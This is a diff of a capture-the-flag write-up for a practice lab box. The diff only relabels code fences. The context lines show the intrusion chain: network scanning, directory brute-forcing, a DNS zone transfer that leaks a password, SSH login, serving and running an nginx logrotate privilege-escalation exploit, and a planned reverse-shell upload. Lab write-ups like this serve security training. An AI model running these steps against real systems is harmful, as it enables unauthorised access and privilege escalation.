@@ -5,7 +5,7 @@
 ## Net Discover & NMAP
 First thinks first
 
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 
  Currently scanning: 10.1.1.0/24   |   Screen View: Unique Hosts                                                                                                                                                                            
@@ -58,7 +58,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Since We have http port open we will need to do some enumerations with feroxbuster
 ## FEROXBUSTER
-```console
+```bash
 feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u $url -t 500 -o ferox-$ip-full.log
 
  ___  ___  __   __     __      __         __   ___
@@ -90,17 +90,17 @@ by Ben "epi" Risher 🤓                 ver: 2.7.1
 ## HTTP
 Visiting the website we see an image stating that the 3rd user stores his password in TXT.
 After inspecting the page source we found :
-```console
+```bash
  <img src="comic.png" alt="comic"> 
 <!--webmaster.hmv-->
 ```
 That means we have to add this domain to our hostfile
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ sudo sh -c "echo '10.1.1.25     webmaster.hmv' >> /etc/hosts"
 ```
 
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ dig axfr @10.1.1.25 webmaster.hmv    
 
@@ -126,7 +126,7 @@ webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaste
 
 Using the password from the TXT Record we ssh to the box with user john
 
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ ssh john@$ip                                                              
 john@10.1.1.25's password: 
@@ -152,7 +152,7 @@ User john may run the following commands on webmaster:
 
 ## Searching for nginx Local Privilage Escalation
 
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ searchsploit nginx   
 -------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -167,7 +167,7 @@ Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation  
 ```
 
 ## Upload the exploit to the machine.
-```console
+```bash
 ──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
@@ -188,7 +188,7 @@ john@webmaster:/tmp$ chmod +x exploit.sh
 # Exploit usage:
 from script's comments we get ./nginxed-root.sh path_to_nginx_error.log
 
-```console
+```bash
 john@webmaster:/tmp$ find / -name error.log 2>/dev/null
 /var/log/nginx/error.log
 john@webmaster:/tmp$ ./exploit.sh /var/log/nginx/error.log
@@ -230,7 +230,7 @@ uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),3
 Since we have access to /var/www/html lets try to upload a RS and get this www-data user.
 I personaly use Pentest monkey.
 
-```console
+```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
